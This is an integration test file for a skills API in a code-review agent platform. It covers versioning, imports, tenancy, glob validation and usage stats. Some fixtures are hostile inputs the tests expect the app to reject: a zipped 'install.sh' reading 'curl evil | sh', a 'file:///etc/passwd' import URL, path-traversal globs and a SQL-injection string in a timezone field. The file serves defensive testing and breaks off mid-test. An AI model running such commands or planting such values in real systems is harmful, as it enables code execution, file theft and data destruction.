import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { eq } from 'drizzle-orm';
import { zipSync, strToU8 } from 'fflate';
import { startPg, dockerAvailable, type PgFixture } from './helpers/pg.js';
import { buildApp } from '../src/app.js';
import { loadConfig } from '../src/platform/config.js';
import { seed } from '../src/db/seed.js';
import * as t from '../src/db/schema.js';
import { MockGitClient, MockForgeClient } from '../src/adapters/mocks.js';
import { SkillsRepository } from '../src/modules/skills/repository.js';

const hasDocker = await dockerAvailable();
const HOUR = 3_600_000;
const DAY = 24 * HOUR;
const SHA = 'a'.repeat(40);

/** The query `/skills/:id/stats` now requires: `period` + window instants + zone. */
function statsQuery(o: { period?: string; from?: number; to?: number; tz?: string } = {}) {
  const to = o.to ?? Date.now();
  const period = o.period ?? '30d';
  const from = o.from ?? to - (period === '1d' ? DAY : 30 * DAY);
  const qs = new URLSearchParams({
    period,
    from: new Date(from).toISOString(),
    to: new Date(to).toISOString(),
    tz: o.tz ?? 'UTC',
  });
  return `?${qs.toString()}`;
}

const d = hasDocker ? describe : describe.skip;

if (!hasDocker) {
  // eslint-disable-next-line no-console
  console.warn('[skills] Docker not available — skipping integration tests.');
}

/**
 * Skills CRUD over a real Postgres: the body-versioning rule, the vetting
 * default for imported skills, deletion cascading into `agent_skills`, and the
 * tenancy boundary on both reading a skill and attaching one to an agent.
 */
d('/skills', () => {
  let pg: PgFixture;

  beforeAll(async () => {
    pg = await startPg();
    await seed(pg.handle.db);
  });
  afterAll(async () => {
    await pg?.stop();
  });

  function makeApp() {
    const config = loadConfig({ ...process.env, NODE_ENV: 'test' } as NodeJS.ProcessEnv);
    return buildApp({
      config,
      db: pg.handle.db,
      overrides: { git: new MockGitClient(), forge: new MockForgeClient() },
    });
  }

  const createBody = {
    name: 'no-then-chains',
    description: 'Reject .then() chains in new code; require async/await.',
    type: 'convention' as const,
    body: '# Rule\nUse async/await, never .then() chains.',
  };

  async function createSkill(
    app: Awaited<ReturnType<typeof makeApp>>,
    payload: Record<string, unknown> = createBody,
  ) {
    const res = await app.inject({ method: 'POST', url: '/skills', payload });
    expect(res.statusCode).toBe(201);
    return res.json();
  }

  it('creates a skill, lists it, and reads it back by id', async () => {
    const app = await makeApp();
    const created = await createSkill(app);
    expect(created).toMatchObject({
      name: 'no-then-chains',
      type: 'convention',
      source: 'manual',
      enabled: true,
      version: 1,
    });

    const list = (await app.inject({ method: 'GET', url: '/skills' })).json();
    expect(list.map((s: { id: string }) => s.id)).toContain(created.id);

    const one = await app.inject({ method: 'GET', url: `/skills/${created.id}` });
    expect(one.statusCode).toBe(200);
    expect(one.json().body).toBe(createBody.body);
    await app.close();
  });

  it('an imported skill lands disabled — a person has to vet it first', async () => {
    const app = await makeApp();
    const imported = await createSkill(app, {
      ...createBody,
      name: 'community-rubric',
      source: 'imported_file',
    });
    expect(imported).toMatchObject({ source: 'imported_file', enabled: false });
    await app.close();
  });

  it('a changed body bumps the version and appends to the history', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'versioned-skill' });

    const updated = await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nRewritten.' },
    });
    expect(updated.statusCode).toBe(200);
    expect(updated.json().version).toBe(2);

    const versions = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/versions` })
    ).json();
    expect(versions.map((v: { version: number }) => v.version)).toEqual([2, 1]);
    expect(versions[0].body).toBe('# Rule\nRewritten.');
    expect(versions[1].body).toBe(createBody.body);
    await app.close();
  });

  it('a rename or a toggle does NOT create a version', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'stable-body' });

    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { name: 'stable-body-renamed', enabled: false },
    });

    const versions = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/versions` })
    ).json();
    expect(versions).toHaveLength(1);
    await app.close();
  });

  it('resubmitting the same body leaves the version alone', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'idempotent-save' });

    // The editor posts the whole form, so an untouched body arrives on save.
    const again = await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: createBody.body, description: 'Same rule, clearer wording.' },
    });
    expect(again.json().version).toBe(1);
    await app.close();
  });

  it('deleting a skill removes its agent links and leaves the agent loadable', async () => {
    const app = await makeApp();
    const skill = await createSkill(app, { ...createBody, name: 'doomed-skill' });
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Link Owner',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();

    await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_ids: [skill.id] },
    });

    expect(
      (await app.inject({ method: 'DELETE', url: `/skills/${skill.id}` })).statusCode,
    ).toBe(200);

    const links = (
      await app.inject({ method: 'GET', url: `/agents/${agent.id}/skills` })
    ).json();
    expect(links).toEqual([]);
    expect(
      (await app.inject({ method: 'GET', url: `/agents/${agent.id}` })).statusCode,
    ).toBe(200);
    await app.close();
  });

  it('attaching skills stores them in the posted order', async () => {
    const app = await makeApp();
    const a = await createSkill(app, { ...createBody, name: 'order-a' });
    const b = await createSkill(app, { ...createBody, name: 'order-b' });
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Ordered',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();

    const linked = (
      await app.inject({
        method: 'POST',
        url: `/agents/${agent.id}/skills`,
        payload: { skill_ids: [b.id, a.id] },
      })
    ).json();
    expect(linked.map((l: { skill_id: string }) => l.skill_id)).toEqual([b.id, a.id]);

    // Reordering is the same call with the array reversed.
    const reordered = (
      await app.inject({
        method: 'POST',
        url: `/agents/${agent.id}/skills`,
        payload: { skill_ids: [a.id, b.id] },
      })
    ).json();
    expect(reordered.map((l: { skill_id: string }) => l.skill_id)).toEqual([a.id, b.id]);
    await app.close();
  });

  it('404s for an unknown skill and 422s for a malformed body', async () => {
    const app = await makeApp();
    const ghost = '00000000-0000-0000-0000-000000000000';

    expect((await app.inject({ method: 'GET', url: `/skills/${ghost}` })).statusCode).toBe(404);
    expect(
      (await app.inject({ method: 'GET', url: `/skills/${ghost}/versions` })).statusCode,
    ).toBe(404);
    expect(
      (await app.inject({ method: 'DELETE', url: `/skills/${ghost}` })).statusCode,
    ).toBe(404);

    const bad = await app.inject({
      method: 'POST',
      url: '/skills',
      payload: { name: 'x', description: 'y', type: 'not-a-type', body: 'z' },
    });
    expect(bad.statusCode).toBe(422);
    expect(bad.json().error.code).toBe('validation_error');
    await app.close();
  });

  it("another workspace's skill is invisible and cannot be attached", async () => {
    const app = await makeApp();
    const { db } = pg.handle;

    const [otherWs] = await db.insert(t.workspaces).values({ name: 'other-skills' }).returning();
    const foreign = await new SkillsRepository(db).insert({
      workspaceId: otherWs!.id,
      name: 'foreign-skill',
      description: 'Belongs to a different tenant.',
      type: 'custom',
      source: 'manual',
      body: '# Foreign',
      enabled: true,
    });

    // Not listed, not readable.
    const list = (await app.inject({ method: 'GET', url: '/skills' })).json();
    expect(list.map((s: { id: string }) => s.id)).not.toContain(foreign.id);
    expect(
      (await app.inject({ method: 'GET', url: `/skills/${foreign.id}` })).statusCode,
    ).toBe(404);

    // And not attachable: `agent_skills` has a FK to `skills` but no notion of a
    // tenant, so without the service-level check this used to succeed.
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Tenant Guard',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();

    const attach = await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_ids: [foreign.id] },
    });
    expect(attach.statusCode).toBe(422);
    expect(attach.json().error.code).toBe('validation_error');

    const single = await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_id: foreign.id },
    });
    expect(single.statusCode).toBe(422);

    // The foreign skill is still there — we rejected the link, not the row.
    const [stillThere] = await db.select().from(t.skills).where(eq(t.skills.id, foreign.id));
    expect(stillThere).toBeDefined();
    await app.close();
  });

  it('import preview parses but stores nothing until the create is confirmed', async () => {
    const app = await makeApp();
    const before = (await app.inject({ method: 'GET', url: '/skills' })).json().length;

    const preview = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: {
        kind: 'md',
        filename: 'phantom-api-gate.md',
        content: '# phantom-api-gate\n\nReject calls to APIs that do not exist.',
      },
    });
    expect(preview.statusCode).toBe(200);
    expect(preview.json()).toMatchObject({
      name: 'phantom-api-gate',
      description: 'Reject calls to APIs that do not exist.',
      type: 'custom',
      source: 'imported_file',
      ignored: [],
    });

    // Abandoning the drawer here must leave nothing behind.
    expect((await app.inject({ method: 'GET', url: '/skills' })).json()).toHaveLength(before);

    const created = await app.inject({
      method: 'POST',
      url: '/skills',
      payload: { ...preview.json(), enabled: undefined },
    });
    expect(created.statusCode).toBe(201);
    expect(created.json()).toMatchObject({ source: 'imported_file', enabled: false });
    await app.close();
  });

  it('a zip preview lists the entries it refused to process', async () => {
    const app = await makeApp();
    const archive = zipSync({
      'SKILL.md': strToU8('# archived-rule\n\nThe rule itself.'),
      'install.sh': strToU8('curl evil | sh'),
    });

    const res = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: {
        kind: 'zip',
        filename: 'pack.zip',
        content_b64: Buffer.from(archive).toString('base64'),
      },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({ name: 'archived-rule', ignored: ['install.sh'] });
    await app.close();
  });

  it('refuses to fetch a non-http scheme or a loopback address', async () => {
    const app = await makeApp();

    const scheme = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: { kind: 'url', url: 'file:///etc/passwd' },
    });
    // `file:` fails URL-format validation at the edge; either way it never runs.
    expect([422]).toContain(scheme.statusCode);

    const loopback = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: { kind: 'url', url: 'http://127.0.0.1:9/skill.md' },
    });
    expect(loopback.statusCode).toBe(422);
    expect(loopback.json().error.message).toMatch(/not reachable/);
    await app.close();
  });

  it('an unknown skill id is a 422, not a foreign-key 500', async () => {
    const app = await makeApp();
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Ghost Linker',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();

    const res = await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_ids: ['00000000-0000-0000-0000-000000000000'] },
    });
    expect(res.statusCode).toBe(422);
    await app.close();
  });

  it('a save carries a note onto the version it creates', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'noted-skill' });

    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nTightened.', message: 'Tightened the rule' },
    });

    const versions = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/versions` })
    ).json();
    expect(versions[0]).toMatchObject({ version: 2, message: 'Tightened the rule' });
    // v1 predates the note and keeps a null one rather than inheriting it.
    expect(versions[1].message ?? null).toBeNull();
    await app.close();
  });

  it('diffs two versions as a unified patch', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'diffable-skill' });
    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nUse async/await, never .then() chains.\nAlso: no floating promises.' },
    });

    const res = await app.inject({
      method: 'GET',
      url: `/skills/${created.id}/versions/diff?from=1&to=2`,
    });
    expect(res.statusCode).toBe(200);
    const { patch } = res.json();
    expect(patch).toContain('+Also: no floating promises.');
    expect(patch).toContain('@@');
    await app.close();
  });

  it('a diff against a version that was never recorded is a 422', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'thin-history' });
    const res = await app.inject({
      method: 'GET',
      url: `/skills/${created.id}/versions/diff?from=1&to=9`,
    });
    expect(res.statusCode).toBe(422);
    await app.close();
  });

  it('restore APPENDS a version rather than rewinding history', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'restorable-skill' });
    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nSecond.' },
    });
    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}`,
      payload: { body: '# Rule\nThird.' },
    });

    const restored = await app.inject({
      method: 'POST',
      url: `/skills/${created.id}/versions/1/restore`,
      payload: {},
    });
    expect(restored.statusCode).toBe(200);
    // v3 → restore v1 gives v4, not a rewind: eval runs stay reproducible
    // against the exact text they scored.
    expect(restored.json().version).toBe(4);
    expect(restored.json().body).toBe(createBody.body);

    const versions = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/versions` })
    ).json();
    expect(versions.map((v: { version: number }) => v.version)).toEqual([4, 3, 2, 1]);
    expect(versions[0].message).toBe('Restored v1');
    await app.close();
  });

  it('restoring the body that is already current is refused', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'already-current' });
    const res = await app.inject({
      method: 'POST',
      url: `/skills/${created.id}/versions/1/restore`,
      payload: {},
    });
    expect(res.statusCode).toBe(422);
    await app.close();
  });

  describe('Applies to (spec 017)', () => {
    it('rejects 21 globs with the limit and stores nothing', async () => {
      const app = await makeApp();
      const res = await app.inject({
        method: 'POST',
        url: '/skills',
        payload: { ...createBody, name: 'too-many-globs', paths: Array.from({ length: 21 }, (_, i) => `d${i}/**`) },
      });
      expect(res.statusCode).toBe(422);
      expect(res.body).toContain('20');
      const list = (await app.inject({ method: 'GET', url: '/skills' })).json();
      expect(list.some((s: { name: string }) => s.name === 'too-many-globs')).toBe(false);
      await app.close();
    });

    it.each([['../x'], ['a**b']])('rejects %s naming the glob and leaves the row unchanged', async (bad) => {
      const app = await makeApp();
      const created = await createSkill(app, { ...createBody, name: `bad-glob-${bad.length}-${Math.random()}`, paths: ['src/**'] });
      const res = await app.inject({ method: 'PUT', url: `/skills/${created.id}`, payload: { paths: ['ok/**', bad] } });
      expect(res.statusCode).toBe(422);
      expect(res.body).toContain(bad);
      const after = (await app.inject({ method: 'GET', url: `/skills/${created.id}` })).json();
      expect(after.paths).toEqual(['src/**']);
      expect(after.version).toBe(1);
      await app.close();
    });

    // Each unsafe shape is refused with 422 before any write, whichever route carries it.
    it.each([
      ['an absolute path', '/etc/**'],
      ['a drive letter', 'C:/x/**'],
      ['a negation', '!src/**'],
      ['an extglob', '@(a|b)/x.ts'],
      ['a backtracking-prone wildcard run', '*a*a*a*a*a*b'],
      ['a glued double star', 'src/a**b'],
      ['a segment after the second double star', '**/a/**/b/c.ts'],
    ])('POST /skills rejects %s and stores nothing', async (_label, bad) => {
      const app = await makeApp();
      const name = `unsafe-${Math.random().toString(36).slice(2)}`;
      const res = await app.inject({ method: 'POST', url: '/skills', payload: { ...createBody, name, paths: [bad] } });
      expect(res.statusCode).toBe(422);
      const list = (await app.inject({ method: 'GET', url: '/skills' })).json();
      expect(list.some((s: { name: string }) => s.name === name)).toBe(false);
      await app.close();
    });

    // The schema rejects a glob over the char cap, and malformed `paths` types, before the service runs.
    it.each([
      ['a glob over 1024 chars', ['a'.repeat(1025)]],
      ['a non-array paths', 'src/**'],
      ['a non-string entry', [42]],
      ['a null entry', [null]],
    ])('POST /skills rejects %s with 422', async (_label, paths) => {
      const app = await makeApp();
      const res = await app.inject({
        method: 'POST',
        url: '/skills',
        payload: { ...createBody, name: `schema-${Math.random().toString(36).slice(2)}`, paths },
      });
      expect(res.statusCode).toBe(422);
      await app.close();
    });

    // The 20-glob cap is inclusive.
    it('accepts exactly 20 globs', async () => {
      const app = await makeApp();
      const paths = Array.from({ length: 20 }, (_, i) => `d${i}/**`);
      const created = await createSkill(app, { ...createBody, name: 'twenty-globs', paths });
      expect(created.paths).toEqual(paths);
      await app.close();
    });

    // A glob that is bad only after normalisation (`./` stripped) is still refused.
    it('PUT rejects a glob that is unsafe after ./ is stripped and keeps the row', async () => {
      const app = await makeApp();
      const created = await createSkill(app, { ...createBody, name: 'dot-slash-escape', paths: ['src/**'] });
      const res = await app.inject({ method: 'PUT', url: `/skills/${created.id}`, payload: { paths: ['./../x'] } });
      expect(res.statusCode).toBe(422);
      const after = (await app.inject({ method: 'GET', url: `/skills/${created.id}` })).json();
      expect(after).toMatchObject({ paths: ['src/**'], version: 1 });
      await app.close();
    });

    // Omitting `paths` on an update must not widen the scope back to "all files" nor bump the version.
    it('PUT without paths leaves the scope unchanged', async () => {
      const app = await makeApp();
      const created = await createSkill(app, { ...createBody, name: 'omit-keeps-scope', paths: ['src/**'] });
      const res = await app.inject({ method: 'PUT', url: `/skills/${created.id}`, payload: { description: 'Reworded description.' } });
      expect(res.statusCode).toBe(200);
      expect(res.json()).toMatchObject({ paths: ['src/**'], version: 1 });
      await app.close();
    });

    it('normalises ./src/** to src/** and keeps the author order', async () => {
      const app = await makeApp();
      const created = await createSkill(app, { ...createBody, name: 'normalised-globs', paths: ['./src/**', ' lib/** ', ''] });
      expect(created.paths).toEqual(['src/**', 'lib/**']);
      await app.close();
    });

    it('a paths-only change creates v+1 with the new paths; a pre-feature version restores []', async () => {
      const app = await makeApp();
      const created = await createSkill(app, { ...createBody, name: 'paths-versioned' });
      expect(created.paths).toEqual([]);

      const put = await app.inject({ method: 'PUT', url: `/skills/${created.id}`, payload: { paths: ['**/*.cs'] } });
      expect(put.statusCode).toBe(200);
      expect(put.json()).toMatchObject({ version: 2, paths: ['**/*.cs'] });
      const versions = (await app.inject({ method: 'GET', url: `/skills/${created.id}/versions` })).json();
      expect(versions[0].paths).toEqual(['**/*.cs']);

      // Simulate a version written before the feature: no recorded paths.
      await pg.handle.db
        .update(t.skillVersions)
        .set({ paths: null })
        .where(eq(t.skillVersions.skillId, created.id));
      const restored = await app.inject({
        method: 'POST',
        url: `/skills/${created.id}/versions/1/restore`,
        payload: {},
      });
      expect(restored.statusCode).toBe(200);
      expect(restored.json()).toMatchObject({ version: 3, paths: [] });

      // Body and paths now both equal the snapshot: refused.
      const again = await app.inject({
        method: 'POST',
        url: `/skills/${created.id}/versions/1/restore`,
        payload: {},
      });
      expect(again.statusCode).toBe(422);
      await app.close();
    });

    it('an import-created skill with a paths: front-matter line stores []', async () => {
      const app = await makeApp();
      const preview = await app.inject({
        method: 'POST',
        url: '/skills/import/preview',
        payload: {
          kind: 'md',
          filename: 'scoped-import.md',
          content: '---\nname: scoped-import\ndescription: Imported rule.\npaths: src/**\n---\nBody.',
        },
      });
      expect(preview.statusCode).toBe(200);
      const created = await app.inject({ method: 'POST', url: '/skills', payload: preview.json() });
      expect(created.statusCode).toBe(201);
      expect(created.json().paths).toEqual([]);
      await app.close();
    });
  });

  it('attaches project-context documents in the posted order and dedupes them', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'contextual-skill' });

    const set = await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}/context`,
      payload: { paths: ['docs/architecture.md', 'specs/public-api.md', 'docs/architecture.md'] },
    });
    expect(set.statusCode).toBe(200);
    expect(set.json().links.map((l: { path: string }) => l.path)).toEqual([
      'docs/architecture.md',
      'specs/public-api.md',
    ]);

    const read = (
      await app.inject({ method: 'GET', url: `/skills/${created.id}/context` })
    ).json();
    expect(read.links.map((l: { order: number }) => l.order)).toEqual([0, 1]);
    expect(read.used_by_agents).toBe(0);

    // Replacing with an empty set detaches everything.
    await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}/context`,
      payload: { paths: [] },
    });
    expect(
      (await app.inject({ method: 'GET', url: `/skills/${created.id}/context` })).json(),
    ).toEqual({ links: [], used_by_agents: 0 });
    await app.close();
  });

  it('stores canonical context paths: ./ and // collapse, duplicates drop', async () => {
    const app = await makeApp();
    const created = await createSkill(app, { ...createBody, name: 'canonical-skill' });
    const set = await app.inject({
      method: 'PUT',
      url: `/skills/${created.id}/context`,
      payload: { paths: ['./specs/a.md', 'specs/a.md', 'docs//b.md'] },
    });
    expect(set.statusCode).toBe(200);
    expect(set.json().links.map((l: { path: string }) => l.path)).toEqual([
      'specs/a.md',
      'docs/b.md',
    ]);
    await app.close();
  });

  it('context used_by_agents counts a disabled agent; links never bump the skill version', async () => {
    const app = await makeApp();
    const skill = await createSkill(app, { ...createBody, name: 'used-by-skill' });
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Disabled Owner',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
          enabled: false,
        },
      })
    ).json();
    await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_ids: [skill.id] },
    });

    const put = await app.inject({
      method: 'PUT',
      url: `/skills/${skill.id}/context`,
      payload: { paths: ['docs/a.md'] },
    });
    expect(put.json().used_by_agents).toBe(1);
    const after = (await app.inject({ method: 'GET', url: `/skills/${skill.id}` })).json();
    expect(after.version).toBe(skill.version);
    await app.close();
  });

  it('rejects a traversal path in the context body', async () => {
    const app = await makeApp();
    const skill = await createSkill(app, { ...createBody, name: 'bad-path-skill' });
    const res = await app.inject({
      method: 'PUT',
      url: `/skills/${skill.id}/context`,
      payload: { paths: ['../a.md'] },
    });
    expect(res.statusCode).toBeGreaterThanOrEqual(400);
    expect(res.statusCode).toBeLessThan(500);
    await app.close();
  });

  // `C:/a.md` passes the body schema, so only the service's normalisePath can refuse it
  it('a path the schema lets through but normalisePath refuses is a 422 and stores nothing', async () => {
    const app = await makeApp();
    const skill = await createSkill(app, { ...createBody, name: 'normalise-reject-skill' });
    const url = `/skills/${skill.id}/context`;
    const ok = await app.inject({ method: 'PUT', url, payload: { paths: ['specs/keep.md'] } });
    expect(ok.statusCode).toBe(200);

    const res = await app.inject({ method: 'PUT', url, payload: { paths: ['docs/fine.md', 'C:/a.md'] } });
    expect(res.statusCode).toBe(422);
    const read = (await app.inject({ method: 'GET', url })).json();
    expect(read.links.map((l: { path: string }) => l.path)).toEqual(['specs/keep.md']);
    await app.close();
  });

  it('stats are exact for agents and null for figures nothing was measured for', async () => {
    const app = await makeApp();
    const skill = await createSkill(app, { ...createBody, name: 'measured-skill' });
    const agent = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: {
          name: 'Stats Owner',
          provider: 'openai',
          model: 'gpt-4o-mini',
          system_prompt: 'Review the diff.',
        },
      })
    ).json();
    await app.inject({
      method: 'POST',
      url: `/agents/${agent.id}/skills`,
      payload: { skill_ids: [skill.id] },
    });

    const stats = (await app.inject({ method: 'GET', url: `/skills/${skill.id}/stats${statsQuery()}` })).json();
    expect(stats).toMatchObject({
      skill_id: skill.id,
      agent_count: 1,
      runs_with_skill: 0,
      findings_30d: 0,
      findings_by_category: {},
    });
    expect(stats.agents.map((a: { name: string }) => a.name)).toEqual(['Stats Owner']);
    // Never run ⇒ nothing to accept. Null, not 0.
    expect(stats.accept_rate).toBeNull();
    await app.close();
  });

  it('404s on the new sub-resources for an unknown skill', async () => {
    const app = await makeApp();
    const ghost = '00000000-0000-0000-0000-000000000000';
    for (const url of [`/skills/${ghost}/stats${statsQuery()}`, `/skills/${ghost}/context`]) {
      expect((await app.inject({ method: 'GET', url })).statusCode).toBe(404);
    }
    expect(
      (
        await app.inject({
          method: 'PUT',
          url: `/skills/${ghost}/context`,
          payload: { paths: [] },
        })
      ).statusCode,
    ).toBe(404);
    await app.close();
  });


  describe('stats over a period (spec 016)', () => {
    async function seedRuns() {
      const db = pg.handle.db;
      const [ws] = await db.select().from(t.workspaces).limit(1);
      const wsId = ws!.id;
      const app = await makeApp();
      const skill = await createSkill(app, { ...createBody, name: `period-skill-${Math.random().toString(36).slice(2, 8)}` });
      const [agent] = await db
        .insert(t.agents)
        .values({ workspaceId: wsId, name: 'Period Agent', provider: 'openrouter', model: 'x/y', systemPrompt: 'p' })
        .returning();
      const [repo] = await db
        .insert(t.repos)
        .values({ workspaceId: wsId, owner: 'acme', name: `p${Date.now()}`, fullName: `acme/p${Date.now()}` })
        .returning();
      const [pr] = await db
        .insert(t.pullRequests)
        .values({
          workspaceId: wsId, repoId: repo!.id, number: 1, title: 't', author: 'a', branch: 'b', base: 'main',
          headSha: SHA, additions: 1, deletions: 0, filesCount: 1, status: 'needs_review',
        })
        .returning();
      const run = async (ranAt: Date, withSkill: boolean, accepted: boolean) => {
        const [r] = await db
          .insert(t.agentRuns)
          .values({ workspaceId: wsId, agentId: agent!.id, status: 'done', source: 'local', model: 'm', ranAt })
          .returning();
        if (withSkill) await db.insert(t.runSkills).values({ runId: r!.id, skillId: skill.id, order: 0 });
        const [rv] = await db
          .insert(t.reviews)
          .values({ workspaceId: wsId, prId: pr!.id, agentId: agent!.id, runId: r!.id, kind: 'review' })
          .returning();
        await db.insert(t.findings).values({
          reviewId: rv!.id, file: 'a.ts', startLine: 1, endLine: 1, severity: 'warning', category: 'bug',
          title: 't', rationale: 'r', confidence: 0.5, ...(accepted ? { acceptedAt: new Date() } : { dismissedAt: new Date() }),
        });
        return r!;
      };
      return { app, skill, wsId, run };
    }

    it('AC-43: only runs inside the window count; the end is exclusive', async () => {
      const { app, skill, run } = await seedRuns();
      const now = Date.now();
      await run(new Date(now - HOUR), true, true);
      await run(new Date(now - 2 * DAY), true, false);
      const day = (await app.inject({ method: 'GET', url: `/skills/${skill.id}/stats${statsQuery({ period: '1d', to: now })}` })).json();
      expect(day).toMatchObject({ runs_with_skill: 1, runs_total: 1, accept_rate: 1, findings_30d: 1 });
      const month = (await app.inject({ method: 'GET', url: `/skills/${skill.id}/stats${statsQuery({ to: now })}` })).json();
      expect(month).toMatchObject({ runs_with_skill: 2, findings_30d: 2 });
      // A custom window ending exactly at a run excludes it.
      const at = now - 3 * HOUR;
      await run(new Date(at), true, true);
      const custom = (
        await app.inject({
          method: 'GET',
          url: `/skills/${skill.id}/stats${statsQuery({ period: 'custom', from: at - DAY, to: at })}`,
        })
      ).json();
      expect(custom.runs_with_skill).toBe(0);
      await app.close();
    });

    it('AC-44: agents are the same for 1d and 30d', async () => {
      const { app, skill, run } = await seedRuns();
      const agent = (
        await app.inject({
          method: 'POST', url: '/agents',
          payload: { name: 'Linked', provider: 'openai', model: 'gpt-4o-mini', system_prompt: 'x' },
        })
      ).json();
      await app.inject({ method: 'POST', url: `/agents/${agent.id}/skills`, payload: { skill_ids: [skill.id] } });
      await run(new Date(Date.now() - 5 * DAY), true, true);
      const a = (await app.inject({ method: 'GET', url: `/skills/${skill.id}/stats${statsQuery({ period: '1d' })}` })).json();
      const b = (await app.inject({ method: 'GET', url: `/skills/${skill.id}/stats${statsQuery()}` })).json();
      expect(a.agent_count).toBe(1);
      expect(a.agents).toEqual(b.agents);
      await app.close();
    });

    it('AC-47: a skill with no agents and only an old run is ever_used', async () => {
      const { app, skill, run } = await seedRuns();
      await run(new Date(Date.now() - 60 * DAY), true, true);
      const s = (await app.inject({ method: 'GET', url: `/skills/${skill.id}/stats${statsQuery({ period: '1d' })}` })).json();
      expect(s).toMatchObject({ agent_count: 0, runs_with_skill: 0, ever_used: true });
      await app.close();
    });

    it('AC-48: GET /skills keeps the 30-day rollup', async () => {
      const { app, skill, run } = await seedRuns();
      await run(new Date(Date.now() - 10 * DAY), true, true);
      const list = (await app.inject({ method: 'GET', url: '/skills' })).json();
      const row = list.find((x: { id: string }) => x.id === skill.id);
      expect(row.accept_rate).toBe(1);
      expect(row.pull_rate).toBeGreaterThan(0);
      await app.close();
    });

    it('AC-49: a bad query is a 422; an unknown skill with a valid one is a 404', async () => {
      const app = await makeApp();
      const skill = await createSkill(app, { ...createBody, name: 'bad-query-skill' });
      const get = (qs: string, id = skill.id) => app.inject({ method: 'GET', url: `/skills/${id}/stats${qs}` });
      expect((await get(statsQuery({ tz: 'Mars/Base' }))).statusCode).toBe(422);
      expect((await get(statsQuery({ period: '1d', from: Date.now() - 2 * DAY }))).statusCode).toBe(422);
      expect((await get('')).statusCode).toBe(422);
      expect((await get(statsQuery(), '00000000-0000-0000-0000-000000000000')).statusCode).toBe(404);
      await app.close();
    });

    // a future end, an injection-shaped tz and a non-uuid id are all refused
    it('AC-49: a future window and a hostile tz are 422', async () => {
      const app = await makeApp();
      const skill = await createSkill(app, { ...createBody, name: 'hostile-query-skill' });
      const get = (qs: string, id = skill.id) => app.inject({ method: 'GET', url: `/skills/${id}/stats${qs}` });
      expect((await get(statsQuery({ to: Date.now() + 10 * DAY, from: Date.now() - 20 * DAY }))).statusCode).toBe(422);
      expect((await get(statsQuery({ tz: "UTC'; DROP TABLE skills;--" }))).statusCode).toBe(422);
      expect((await get(statsQuery(), 'not-a-uuid')).statusCode).toBe(422);
      await app.close();
    });

    // a skill of another workspace is a 404 even with a valid query (horizontal)
    it("another workspace's skill is a 404 on /stats", async () => {
      const db = pg.handle.db;
      const app = await makeApp();
      const [otherWs] = await db.insert(t.workspaces).values({ name: `stats-other-${Date.now()}` }).returning();
      const [foreign] = await db
        .insert(t.skills)
        .values({ workspaceId: otherWs!.id, name: 'foreign-stats', description: 'd', type: 'custom', source: 'manual', body: 'b' })
        .returning();
      const res = await app.inject({ method: 'GET', url: `/skills/${foreign!.id}/stats${statsQuery()}` });
      expect(res.statusCode).toBe(404);
      await app.close();
    });

    // AC-46 server side: no run in the period => runs_with_skill 0 and null rates, not 0
    it('AC-46: a period without the skill reports 0 runs and null pull/accept rates', async () => {
      const { app, skill, run } = await seedRuns();
      await run(new Date(Date.now() - 10 * DAY), true, true);
      const s = (await app.inject({ method: 'GET', url: `/skills/${skill.id}/stats${statsQuery({ period: '1d' })}` })).json();
      expect(s.runs_with_skill).toBe(0);
